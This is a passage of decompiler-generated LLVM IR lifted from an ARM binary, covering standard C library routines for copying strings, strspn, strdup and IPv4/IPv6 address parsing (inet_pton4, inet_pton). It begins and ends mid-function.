  %v7_1a8f8 = icmp eq i32 %v0_1a8f8, 3
  store i1 %v7_1a8f8, i1* %cpsr_z.global-to-local, align 1
  %v1_1a8fc = add i32 %v0_1a8ec, -1
  store i32 %v1_1a8fc, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_1a8f8, 4
  br i1 %tmp10, label %dec_label_pc_1a990thread-pre-split, label %dec_label_pc_1a904

dec_label_pc_1a904:                               ; preds = %dec_label_pc_1a8f8
  %v3_1a904 = udiv i32 %v0_1a8f8, 4
  store i32 %v3_1a904, i32* %r0.global-to-local, align 4
  %v0_1a908.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1a908

dec_label_pc_1a908:                               ; preds = %dec_label_pc_1a968, %dec_label_pc_1a904
  %v2_1a910 = phi i32 [ %v1_1a960, %dec_label_pc_1a968 ], [ %v1_1a8fc, %dec_label_pc_1a904 ]
  %v0_1a908 = phi i32 [ %v1_1a95c, %dec_label_pc_1a968 ], [ %v0_1a908.pre, %dec_label_pc_1a904 ]
  %v1_1a908 = inttoptr i32 %v0_1a908 to i8*
  %v2_1a908 = load i8, i8* %v1_1a908, align 1
  %v3_1a908 = zext i8 %v2_1a908 to i32
  store i32 %v3_1a908, i32* %r3.global-to-local, align 4
  %v2_1a90c = icmp eq i8 %v2_1a908, 0
  store i1 %v2_1a90c, i1* %cpsr_z.global-to-local, align 1
  %v3_1a910 = add i32 %v2_1a910, 1
  %v4_1a910 = inttoptr i32 %v3_1a910 to i8*
  store i8 %v2_1a908, i8* %v4_1a910, align 1
  %v0_1a914 = load i32, i32* %lr.global-to-local, align 4
  %v1_1a914 = add i32 %v0_1a914, 1
  store i32 %v1_1a914, i32* %ip.global-to-local, align 4
  %v0_1a918 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a918, label %.loopexit, label %dec_label_pc_1a91c

dec_label_pc_1a91c:                               ; preds = %dec_label_pc_1a908
  %v0_1a91c = load i32, i32* @r1, align 4
  %v1_1a91c = add i32 %v0_1a91c, 1
  %v2_1a91c = inttoptr i32 %v1_1a91c to i8*
  %v3_1a91c = load i8, i8* %v2_1a91c, align 1
  %v4_1a91c = zext i8 %v3_1a91c to i32
  store i32 %v4_1a91c, i32* %r3.global-to-local, align 4
  %v2_1a920 = icmp eq i8 %v3_1a91c, 0
  store i1 %v2_1a920, i1* %cpsr_z.global-to-local, align 1
  %v3_1a924 = add i32 %v0_1a914, 2
  %v4_1a924 = inttoptr i32 %v3_1a924 to i8*
  store i8 %v3_1a91c, i8* %v4_1a924, align 1
  %v0_1a928 = load i32, i32* @r1, align 4
  %v1_1a928 = add i32 %v0_1a928, 1
  store i32 %v1_1a928, i32* %r1.global-to-local, align 4
  %v0_1a92c = load i32, i32* %ip.global-to-local, align 4
  %v1_1a92c = add i32 %v0_1a92c, 1
  store i32 %v1_1a92c, i32* %ip.global-to-local, align 4
  %v0_1a930 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a930, label %.loopexit, label %dec_label_pc_1a934

dec_label_pc_1a934:                               ; preds = %dec_label_pc_1a91c
  %v1_1a934 = add i32 %v0_1a928, 2
  %v2_1a934 = inttoptr i32 %v1_1a934 to i8*
  %v3_1a934 = load i8, i8* %v2_1a934, align 1
  %v4_1a934 = zext i8 %v3_1a934 to i32
  store i32 %v4_1a934, i32* %r3.global-to-local, align 4
  %v2_1a938 = icmp eq i8 %v3_1a934, 0
  store i1 %v2_1a938, i1* %cpsr_z.global-to-local, align 1
  %v3_1a93c = add i32 %v0_1a92c, 2
  %v4_1a93c = inttoptr i32 %v3_1a93c to i8*
  store i8 %v3_1a934, i8* %v4_1a93c, align 1
  %v0_1a940 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a940 = add i32 %v0_1a940, 1
  store i32 %v1_1a940, i32* %r1.global-to-local, align 4
  %v0_1a944 = load i32, i32* %ip.global-to-local, align 4
  %v1_1a944 = add i32 %v0_1a944, 1
  store i32 %v1_1a944, i32* %lr.global-to-local, align 4
  %v0_1a948 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a948, label %.loopexit, label %dec_label_pc_1a94c

dec_label_pc_1a94c:                               ; preds = %dec_label_pc_1a934
  %v1_1a94c = add i32 %v0_1a940, 2
  %v2_1a94c = inttoptr i32 %v1_1a94c to i8*
  %v3_1a94c = load i8, i8* %v2_1a94c, align 1
  %v4_1a94c = zext i8 %v3_1a94c to i32
  store i32 %v4_1a94c, i32* %ip.global-to-local, align 4
  store i32 %v1_1a94c, i32* %r3.global-to-local, align 4
  %v2_1a954 = icmp eq i8 %v3_1a94c, 0
  store i1 %v2_1a954, i1* %cpsr_z.global-to-local, align 1
  %v3_1a958 = add i32 %v0_1a944, 2
  %v4_1a958 = inttoptr i32 %v3_1a958 to i8*
  store i8 %v3_1a94c, i8* %v4_1a958, align 1
  %v0_1a95c = load i32, i32* %r3.global-to-local, align 4
  %v1_1a95c = add i32 %v0_1a95c, 1
  store i32 %v1_1a95c, i32* @r1, align 4
  %v0_1a960 = load i32, i32* %lr.global-to-local, align 4
  %v1_1a960 = add i32 %v0_1a960, 1
  store i32 %v1_1a960, i32* %lr.global-to-local, align 4
  %v0_1a964 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a964, label %.loopexit, label %dec_label_pc_1a968

dec_label_pc_1a968:                               ; preds = %dec_label_pc_1a94c
  %v0_1a968 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a968 = add i32 %v0_1a968, -1
  store i32 %v1_1a968, i32* %r0.global-to-local, align 4
  %v7_1a968 = icmp eq i32 %v0_1a968, 1
  store i1 %v7_1a968, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a968, label %dec_label_pc_1a970, label %dec_label_pc_1a908

dec_label_pc_1a970:                               ; preds = %dec_label_pc_1a968
  %v0_1a970 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a970 = urem i32 %v0_1a970, 4
  store i32 %v1_1a970, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a990

dec_label_pc_1a978:                               ; preds = %dec_label_pc_1a990
  %v0_1a978 = load i32, i32* @r1, align 4
  %v1_1a978 = inttoptr i32 %v0_1a978 to i8*
  %v2_1a978 = load i8, i8* %v1_1a978, align 1
  %v3_1a978 = zext i8 %v2_1a978 to i32
  store i32 %v3_1a978, i32* %ip.global-to-local, align 4
  %v2_1a97c = icmp eq i8 %v2_1a978, 0
  store i1 %v2_1a97c, i1* %cpsr_z.global-to-local, align 1
  %v1_1a980 = add i32 %v1_1a99c, -1
  store i32 %v1_1a980, i32* %r2.global-to-local, align 4
  %v3_1a984 = add i32 %v3_1a99c, 1
  %v4_1a984 = inttoptr i32 %v3_1a984 to i8*
  store i8 %v2_1a978, i8* %v4_1a984, align 1
  %v5_1a984 = load i32, i32* %lr.global-to-local, align 4
  %v6_1a984 = add i32 %v5_1a984, 1
  store i32 %v6_1a984, i32* %lr.global-to-local, align 4
  %v0_1a988 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a988, label %.loopexit, label %dec_label_pc_1a98c

dec_label_pc_1a98c:                               ; preds = %dec_label_pc_1a978
  %v0_1a98c = load i32, i32* @r1, align 4
  %v1_1a98c = add i32 %v0_1a98c, 1
  store i32 %v1_1a98c, i32* @r1, align 4
  %v0_1a990.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a990thread-pre-split

dec_label_pc_1a990thread-pre-split:               ; preds = %dec_label_pc_1a98c, %dec_label_pc_1a8f8
  %v2_1a9846 = phi i32 [ %v6_1a984, %dec_label_pc_1a98c ], [ %v1_1a8fc, %dec_label_pc_1a8f8 ]
  %v0_1a990.pr = phi i32 [ %v0_1a990.pr.pre, %dec_label_pc_1a98c ], [ %v0_1a8f8, %dec_label_pc_1a8f8 ]
  br label %dec_label_pc_1a990

dec_label_pc_1a990:                               ; preds = %dec_label_pc_1a990thread-pre-split, %dec_label_pc_1a970
  %v3_1a99c = phi i32 [ %v2_1a9846, %dec_label_pc_1a990thread-pre-split ], [ %v1_1a960, %dec_label_pc_1a970 ]
  %v1_1a99c = phi i32 [ %v0_1a990.pr, %dec_label_pc_1a990thread-pre-split ], [ %v1_1a970, %dec_label_pc_1a970 ]
  %v2_1a990 = icmp eq i32 %v1_1a99c, 0
  store i1 %v2_1a990, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a990, label %dec_label_pc_1a998, label %dec_label_pc_1a978

dec_label_pc_1a998:                               ; preds = %dec_label_pc_1a990
  %v0_1a998 = load i32, i32* %ip.global-to-local, align 4
  %v2_1a998 = icmp eq i32 %v0_1a998, 0
  store i1 %v2_1a998, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a998, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_1a998
  %v4_1a99c = add i32 %v3_1a99c, 1
  %v5_1a99c = inttoptr i32 %v4_1a99c to i8*
  store i8 0, i8* %v5_1a99c, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_1a94c, %dec_label_pc_1a934, %dec_label_pc_1a91c, %dec_label_pc_1a908, %dec_label_pc_1a978, %dec_label_pc_1a998, %bb
  %v0_1a9a0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1a9a0, i32* %r0.global-to-local, align 4
  %v2_1a9a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1a9a4, i32* @r4, align 4
  ret i32 %v0_1a9a0

; uselistorder directives
  uselistorder i32 %v1_1a99c, { 1, 0 }
  uselistorder i32 %v1_1a970, { 1, 0 }
  uselistorder i32 %v0_1a968, { 1, 0 }
  uselistorder i32 %v1_1a960, { 0, 2, 1 }
  uselistorder i32 %v1_1a95c, { 1, 0 }
  uselistorder i32 %v0_1a8f8, { 2, 1, 0, 3 }
  uselistorder i32 %v5_1a8ec, { 1, 0 }
  uselistorder i32 %v0_1a8ec, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_1a9e02 = load i32, i32* @r0, align 4
  %v1_1a9e03 = inttoptr i32 %v0_1a9e02 to i8*
  %v2_1a9e04 = load i8, i8* %v1_1a9e03, align 1
  %v3_1a9e05 = zext i8 %v2_1a9e04 to i32
  store i32 %v3_1a9e05, i32* @r2, align 4
  %v2_1a9e46 = icmp eq i8 %v2_1a9e04, 0
  br i1 %v2_1a9e46, label %dec_label_pc_1a9f0, label %dec_label_pc_1a9bc.preheader

dec_label_pc_1a9b4:                               ; preds = %dec_label_pc_1a9bc
  %v1_1a9c4 = add i32 %v0_1a9c4, 1
  %v9_1a9b4 = icmp eq i32 %v0_1a9d0, %v3_1a9bc
  br i1 %v9_1a9b4, label %dec_label_pc_1a9d0, label %dec_label_pc_1a9bc

dec_label_pc_1a9bc:                               ; preds = %dec_label_pc_1a9bc.preheader, %dec_label_pc_1a9b4
  %v0_1a9c4 = phi i32 [ %tmp, %dec_label_pc_1a9bc.preheader ], [ %v1_1a9c4, %dec_label_pc_1a9b4 ]
  %v1_1a9bc = inttoptr i32 %v0_1a9c4 to i8*
  %v2_1a9bc = load i8, i8* %v1_1a9bc, align 1
  %v3_1a9bc = zext i8 %v2_1a9bc to i32
  store i32 %v3_1a9bc, i32* @ip, align 4
  %v2_1a9c0 = icmp eq i8 %v2_1a9bc, 0
  br i1 %v2_1a9c0, label %dec_label_pc_1a9f0, label %dec_label_pc_1a9b4

dec_label_pc_1a9d0:                               ; preds = %dec_label_pc_1a9b4
  %v2_1a9d0 = icmp eq i32 %v0_1a9d0, 0
  br i1 %v2_1a9d0, label %dec_label_pc_1a9f0, label %dec_label_pc_1a9d8

dec_label_pc_1a9d8:                               ; preds = %dec_label_pc_1a9d0
  %v1_1a9d8 = add i32 %v0_1a9d8, 1
  store i32 %v1_1a9d8, i32* @lr, align 4
  %v1_1a9dc = add i32 %v0_1a9dc, 1
  %v1_1a9e0 = inttoptr i32 %v1_1a9dc to i8*
  %v2_1a9e0 = load i8, i8* %v1_1a9e0, align 1
  %v3_1a9e0 = zext i8 %v2_1a9e0 to i32
  store i32 %v3_1a9e0, i32* @r2, align 4
  %v2_1a9e4 = icmp eq i8 %v2_1a9e0, 0
  br i1 %v2_1a9e4, label %dec_label_pc_1a9f0, label %dec_label_pc_1a9bc.preheader

dec_label_pc_1a9bc.preheader:                     ; preds = %entry, %dec_label_pc_1a9d8
  %v0_1a9dc = phi i32 [ %v1_1a9dc, %dec_label_pc_1a9d8 ], [ %v0_1a9e02, %entry ]
  %v0_1a9d8 = phi i32 [ %v1_1a9d8, %dec_label_pc_1a9d8 ], [ 0, %entry ]
  %v0_1a9d0 = phi i32 [ %v3_1a9e0, %dec_label_pc_1a9d8 ], [ %v3_1a9e05, %entry ]
  br label %dec_label_pc_1a9bc

dec_label_pc_1a9f0:                               ; preds = %dec_label_pc_1a9d0, %dec_label_pc_1a9d8, %dec_label_pc_1a9bc, %entry
  %v0_1a9f0 = phi i32 [ 0, %entry ], [ %v0_1a9d8, %dec_label_pc_1a9bc ], [ %v1_1a9d8, %dec_label_pc_1a9d8 ], [ %v0_1a9d8, %dec_label_pc_1a9d0 ]
  ret i32 %v0_1a9f0

; uselistorder directives
  uselistorder i32 %v3_1a9bc, { 1, 0 }
  uselistorder i32 %v0_1a9c4, { 1, 0 }
  uselistorder i32* @ip, { 16, 17, 3, 18, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 8, 9, 0, 10, 11, 12, 13, 14, 29, 30, 5, 31, 4, 32, 7, 6, 20, 21, 23, 24, 2, 25, 26, 22, 27, 83, 80, 81, 82, 1, 84, 15, 19, 28, 35, 34, 33, 36, 37 }
  uselistorder label %dec_label_pc_1a9f0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1a9bc.preheader, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_1a9f8 = load i32, i32* @r4, align 4
  store i32 %v3_1a9f8, i32* %stack_var_-12, align 4
  %v6_1a9f8 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_1aa00 = call i32 @strlen(i8* %arg1)
  %v1_1aa04 = add i32 %v3_1aa00, 1
  store i32 %v1_1aa04, i32* @r4, align 4
  %v1_1aa0c = call i32 @malloc(i32 %v1_1aa04)
  store i32 109088, i32* @lr, align 4
  %v1_1aa1c = icmp ne i32 %v1_1aa0c, 0
  call void @__pseudo_cond_branch(i1 %v1_1aa1c, i32 ptrtoint (i32* @global_var_15700.1087 to i32))
  %v2_1aa24 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1aa24, i32* @r4, align 4
  store i32 %v6_1a9f8, i32* @r5, align 4
  ret i32 %v1_1aa0c

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 8, 7, 6, 3, 2, 14, 5, 13, 12, 11, 4, 10, 9, 1, 0 }
}

define i32 @inet_pton4(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_1aa28 = load i32, i32* @r5, align 4
  %v2_1aa30 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_1aa30, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_1aab83 = load i8, i8* %arg1, align 1
  %v3_1aab84 = zext i8 %v2_1aab83 to i32
  %v5_1aab85 = add i32 %tmp, 1
  store i32 %v5_1aab85, i32* @r4, align 4
  %v2_1aabc6 = icmp eq i8 %v2_1aab83, 0
  store i1 %v2_1aabc6, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1aabc6, label %dec_label_pc_1aac8, label %dec_label_pc_1aa50

dec_label_pc_1aa50:                               ; preds = %entry, %dec_label_pc_1aab8.backedge
  %v0_1aa94 = phi i32 [ %v3_1aab8, %dec_label_pc_1aab8.backedge ], [ %v3_1aab84, %entry ]
  %v1_1aac010.in = phi i32 [ %v3_1aab8, %dec_label_pc_1aab8.backedge ], [ %v3_1aab84, %entry ]
  %v1_1aac010 = add nsw i32 %v1_1aac010.in, -48
  %v2_1aa50 = icmp ugt i32 %v1_1aac010, 8
  %v7_1aa50 = icmp eq i32 %v1_1aac010, 9
  store i1 %v7_1aa50, i1* %cpsr_z.global-to-local, align 1
  %v2_1aa58 = xor i1 %v7_1aa50, true
  %v3_1aa58 = and i1 %v2_1aa50, %v2_1aa58
  br i1 %v3_1aa58, label %dec_label_pc_1aa94, label %dec_label_pc_1aa5c

dec_label_pc_1aa5c:                               ; preds = %dec_label_pc_1aa50
  %v0_1aa5c = load i32, i32* %r0.global-to-local, align 4
  %v1_1aa5c = inttoptr i32 %v0_1aa5c to i8*
  %v2_1aa5c = load i8, i8* %v1_1aa5c, align 1
  %v3_1aa5c = zext i8 %v2_1aa5c to i32
  %v3_1aa64 = mul nuw nsw i32 %v3_1aa5c, 10
  %v4_1aa64 = add nuw nsw i32 %v3_1aa64, %v0_1aa94
  %v1_1aa68 = add nsw i32 %v4_1aa64, -48
  %v2_1aa6c = icmp ugt i32 %v1_1aa68, 254
  %v7_1aa6c = icmp eq i32 %v1_1aa68, 255
  store i1 %v7_1aa6c, i1* %cpsr_z.global-to-local, align 1
  %v2_1aa70 = xor i1 %v7_1aa6c, true
  %v3_1aa70 = and i1 %v2_1aa6c, %v2_1aa70
  br i1 %v3_1aa70, label %dec_label_pc_1aaec, label %dec_label_pc_1aa74

dec_label_pc_1aa74:                               ; preds = %dec_label_pc_1aa5c
  %v0_1aa74 = load i32, i32* %r1.global-to-local, align 4
  %v2_1aa74 = icmp eq i32 %v0_1aa74, 0
  store i1 %v2_1aa74, i1* %cpsr_z.global-to-local, align 1
  %v1_1aa78 = trunc i32 %v1_1aa68 to i8
  store i8 %v1_1aa78, i8* %v1_1aa5c, align 1
  %v0_1aa7c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1aa7c, label %dec_label_pc_1aa80, label %dec_label_pc_1aab8.backedge

dec_label_pc_1aa80:                               ; preds = %dec_label_pc_1aa74
  %v0_1aa80 = load i32, i32* @lr, align 4
  %v1_1aa80 = add i32 %v0_1aa80, 1
  store i32 %v1_1aa80, i32* @lr, align 4
  %v7_1aa84 = icmp eq i32 %v1_1aa80, 4
  store i1 %v7_1aa84, i1* %cpsr_z.global-to-local, align 1
  %v0_1aa88 = load i32, i32* %r1.global-to-local, align 4
  %v1_1aa88 = add i32 %v0_1aa88, 1
  store i32 %v1_1aa88, i32* %r1.global-to-local, align 4
  %v8_1aa8c = icmp sgt i32 %v1_1aa80, 4
  br i1 %v8_1aa8c, label %dec_label_pc_1aaec, label %dec_label_pc_1aab8.backedge

dec_label_pc_1aa94:                               ; preds = %dec_label_pc_1aa50
  %v7_1aa94 = icmp eq i32 %v0_1aa94, 46
  store i1 %v7_1aa94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1aa94, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_1aa94
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1aaec

bb:                                               ; preds = %dec_label_pc_1aa94
  %v1_1aa9c = load i32, i32* %r1.global-to-local, align 4
  %v2_1aa9c = urem i32 %v1_1aa9c, 2
  %v2_1aaa0 = icmp eq i32 %v2_1aa9c, 0
  store i1 %v2_1aaa0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_1aaa0, label %dec_label_pc_1aaec, label %dec_label_pc_1aaac

dec_label_pc_1aaac:                               ; preds = %bb
  %v0_1aaac = load i32, i32* @lr, align 4
  %v7_1aaac = icmp eq i32 %v0_1aaac, 4
  store i1 %v7_1aaac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1aaac, label %dec_label_pc_1aaec, label %dec_label_pc_1aab4

dec_label_pc_1aab4:                               ; preds = %dec_label_pc_1aaac
  %v2_1aab4 = load i32, i32* %r0.global-to-local, align 4
  %v3_1aab4 = add i32 %v2_1aab4, 1
  %v4_1aab4 = inttoptr i32 %v3_1aab4 to i8*
  store i8 0, i8* %v4_1aab4, align 1
  %v5_1aab4 = load i32, i32* %r0.global-to-local, align 4
  %v6_1aab4 = add i32 %v5_1aab4, 1
  store i32 %v6_1aab4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1aab8.backedge

dec_label_pc_1aab8.backedge:                      ; preds = %dec_label_pc_1aab4, %dec_label_pc_1aa74, %dec_label_pc_1aa80
  %v0_1aab8 = load i32, i32* @r4, align 4
  %v1_1aab8 = inttoptr i32 %v0_1aab8 to i8*
  %v2_1aab8 = load i8, i8* %v1_1aab8, align 1
  %v3_1aab8 = zext i8 %v2_1aab8 to i32
  %v5_1aab8 = add i32 %v0_1aab8, 1
  store i32 %v5_1aab8, i32* @r4, align 4
  %v2_1aabc = icmp eq i8 %v2_1aab8, 0
  store i1 %v2_1aabc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1aabc, label %dec_label_pc_1aab8.dec_label_pc_1aac8_crit_edge, label %dec_label_pc_1aa50

dec_label_pc_1aab8.dec_label_pc_1aac8_crit_edge:  ; preds = %dec_label_pc_1aab8.backedge
  %v0_1aac8.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_1aac8

dec_label_pc_1aac8:                               ; preds = %dec_label_pc_1aab8.dec_label_pc_1aac8_crit_edge, %entry
  %v0_1aac8 = phi i32 [ %v0_1aac8.pre, %dec_label_pc_1aab8.dec_label_pc_1aac8_crit_edge ], [ 0, %entry ]
  %v7_1aac8 = icmp eq i32 %v0_1aac8, 3
  store i1 %v7_1aac8, i1* %cpsr_z.global-to-local, align 1
  %v7_1aacc = icmp slt i32 %v0_1aac8, 4
  br i1 %v7_1aacc, label %dec_label_pc_1aaec, label %dec_label_pc_1aad0

dec_label_pc_1aad0:                               ; preds = %dec_label_pc_1aac8
  %v0_1aad0 = load i32, i32* @r5, align 4
  store i32 %v0_1aad0, i32* @r0, align 4
  store i32 %v2_1aa30, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1aadc = call i32 @memcpy()
  br label %dec_label_pc_1aaec

dec_label_pc_1aaec:                               ; preds = %dec_label_pc_1aa5c, %dec_label_pc_1aa80, %bb, %dec_label_pc_1aaac, %.thread12, %dec_label_pc_1aac8, %dec_label_pc_1aad0
  %storemerge = phi i32 [ 1, %dec_label_pc_1aad0 ], [ 0, %dec_label_pc_1aac8 ], [ 0, %.thread12 ], [ 0, %dec_label_pc_1aaac ], [ 0, %bb ], [ 0, %dec_label_pc_1aa80 ], [ 0, %dec_label_pc_1aa5c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_1aa28, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1aac8, { 1, 0 }
  uselistorder i32 %v3_1aab8, { 1, 0 }
  uselistorder i32 %v0_1aa94, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 10, 2, 3, 0, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder label %dec_label_pc_1aaec, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_1aab8.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1aa50, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_1aaf4 = load i32, i32* @r4, align 4
  %v6_1aaf4 = load i32, i32* @r5, align 4
  %v9_1aaf4 = load i32, i32* @r6, align 4
  %v7_1aaf8 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_1aaf8, label %dec_label_pc_1ab18, label %dec_label_pc_1ab0c

dec_label_pc_1ab0c:                               ; preds = %entry
  %v7_1ab0c = icmp eq i32 %arg1, 10
  br i1 %v7_1ab0c, label %dec_label_pc_1ab2c, label %dec_label_pc_1acdc

dec_label_pc_1ab18:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_1ab20 = call i32 @inet_pton4(i8* %arg2, i32 %arg3)
  store i32 %v4_1ab20, i32* %r0.global-to-local, align 4
  store i32 %v4_1ab20, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1acf4

dec_label_pc_1ab2c:                               ; preds = %dec_label_pc_1ab0c
  %v2_1ab2c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1ab2c, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_1ab38 = bitcast i32* %stack_var_-52 to i8*
  %v3_1ab38 = call i32 @__GI_memset(i8* %v2_1ab38, i32 0)
  store i32 %v3_1ab38, i32* %r0.global-to-local, align 4
  %v0_1ab3c = load i32, i32* @r6, align 4
  %v1_1ab3c = inttoptr i32 %v0_1ab3c to i8*
  %v2_1ab3c = load i8, i8* %v1_1ab3c, align 1
  %v3_1ab3c = zext i8 %v2_1ab3c to i32
  store i32 %v3_1ab3c, i32* %r3.global-to-local, align 4
  %v7_1ab40 = icmp eq i8 %v2_1ab3c, 58
  store i32 %v3_1ab38, i32* @r4, align 4
  %v2_1ab48 = add i32 %v3_1ab38, 16
  store i32 %v2_1ab48, i32* %r8.global-to-local, align 4
  br i1 %v7_1ab40, label %dec_label_pc_1ab50, label %dec_label_pc_1ab5c

dec_label_pc_1ab50:                               ; preds = %dec_label_pc_1ab2c
  %v1_1ab50 = add i32 %v0_1ab3c, 1
  %v2_1ab50 = inttoptr i32 %v1_1ab50 to i8*
  %v3_1ab50 = load i8, i8* %v2_1ab50, align 1
  %v4_1ab50 = zext i8 %v3_1ab50 to i32
  store i32 %v4_1ab50, i32* %r3.global-to-local, align 4
  store i32 %v1_1ab50, i32* @r6, align 4
  %v7_1ab54 = icmp eq i8 %v3_1ab50, 58
  br i1 %v7_1ab54, label %dec_label_pc_1ab5c, label %dec_label_pc_1acf0

dec_label_pc_1ab5c:                               ; preds = %dec_label_pc_1ab50, %dec_label_pc_1ab2c
  %v0_1ab60 = phi i32 [ %v1_1ab50, %dec_label_pc_1ab50 ], [ %v0_1ab3c, %dec_label_pc_1ab2c ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_1ab60, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1ac3c7 = inttoptr i32 %v0_1ab60 to i8*
  %v2_1ac3c8 = load i8, i8* %v1_1ac3c7, align 1
  %v3_1ac3c9 = zext i8 %v2_1ac3c8 to i32
  store i32 %v3_1ac3c9, i32* %r0.global-to-local, align 4
  %v1_1ac4010 = call i32 @__GI_tolower(i32 %v3_1ac3c9)
  store i32 %v1_1ac4010, i32* %r0.global-to-local, align 4
  store i32 %v1_1ac4010, i32* @r5, align 4
  %v2_1ac4412 = icmp eq i32 %v1_1ac4010, 0
  br i1 %v2_1ac4412, label %dec_label_pc_1ac4c, label %dec_label_pc_1ab70

dec_label_pc_1ab70:                               ; preds = %dec_label_pc_1ab5c, %dec_label_pc_1ac3c.backedge
  %v0_1ab74 = phi i32 [ %v1_1ac40, %dec_label_pc_1ac3c.backedge ], [ %v1_1ac4010, %dec_label_pc_1ab5c ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_1ac3c.backedge ], [ 0, %dec_label_pc_1ab5c ]
  store i32 ptrtoint ([17 x i8]* @global_var_206dc.1227 to i32), i32* %sb.global-to-local, align 4
